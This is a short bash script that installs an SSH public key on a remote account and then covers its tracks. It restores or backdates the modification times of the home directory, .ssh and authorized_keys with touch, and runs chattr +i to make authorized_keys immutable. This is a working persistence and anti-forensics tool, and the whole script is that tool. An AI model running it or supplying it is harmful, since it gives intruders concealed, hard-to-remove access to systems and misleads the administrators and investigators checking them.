#!/bin/bash

usage () {
	echo "Usage: $0 <local_key> <remote_username> <remote_hostname>"
}

if [ $# -ne 3 ]; then
	usage
	exit 1
fi

key=$1
user=$2
hostname=$3
[ $user = "root" ] && user_home="/root" || user_home="/home/$user"

get_ssh_timestamp="stat $user_home/.ssh 2>/dev/null | grep Modify | cut -d ' ' -f 2,3 | cut -d ':' -f 1,2 | tr -d '-' | tr -d ':' | tr -d ' '"
get_home_timestamp="stat $user_home 2>/dev/null | grep Modify | cut -d ' ' -f 2,3 | cut -d ':' -f 1,2 | tr -d '-' | tr -d ':' | tr -d ' '"
get_keys_timestamp="stat $user_home/.ssh/authorized_keys 2>/dev/null | grep Modify | cut -d ' ' -f 2,3 | cut -d ':' -f 1,2 | tr -d '-' | tr -d ':' | tr -d ' '"

echo "[-] Getting old '$user_home/.ssh' timestamp..."
old_ssh_timestamp=$(ssh -i $key $user@$hostname "$get_ssh_timestamp")
if [ -n "$old_ssh_timestamp" ]; then # '.ssh' exists
	echo "[-] Getting old '$user_home/.ssh/authorized_keys' timestamp..."
	old_keys_timestamp=$(ssh -i $key $user@$hostname "$get_keys_timestamp")
else # '.ssh' doesn't exist
	echo "[*] '$user_home/.ssh' does not exist, will create"
	echo "[-] Getting old '$user_home' timestamp..."
	old_home_timestamp=$(ssh -i $key $user@$hostname "$get_home_timestamp")
fi

echo "[-] Copying key to $user@$hostname..."
ssh-copy-id -i "$key" $user@$hostname

if [ -z "$old_ssh_timestamp" ]; then # '.ssh' doesn't exist
	ssh -i $key $user@$hostname "touch -t $old_home_timestamp $user_home && touch -d '$(date -d '12 days ago') - 15 months' $user_home/.ssh $user_home/.ssh/authorized_keys && chattr +i $user_home/.ssh/authorized_keys"
	echo "[*] Changed timestamps for '$user_home', '.ssh', and 'authorized_keys'; made 'authorized_keys' immutable"
elif [ -z "$old_keys_timestamp" ]; then # '.ssh/authorized_keys' doesn't exist
	echo "[*] '$user_home/.ssh/authorized_keys' didn't not exist, created"
	ssh -i $key $user@$hostname "touch -t $old_ssh_timestamp $user_home/.ssh $user_home/.ssh/authorized_keys && chattr +i $user_home/.ssh/authorized_keys"
	echo "[*] Changed timestamp for 'authorized_keys'; made 'authorized_keys' immutable"
else # '.ssh' and '.ssh/authorized_keys' already exist
	ssh -i $key $user@$hostname "touch -t $old_keys_timestamp $user_home/.ssh $user_home/.ssh/authorized_keys && chattr +i $user_home/.ssh/authorized_keys"
	echo "[*] Changed timestamp for 'authorized_keys'; made 'authorized_keys' immutable"
fi

echo "[+] Done!"
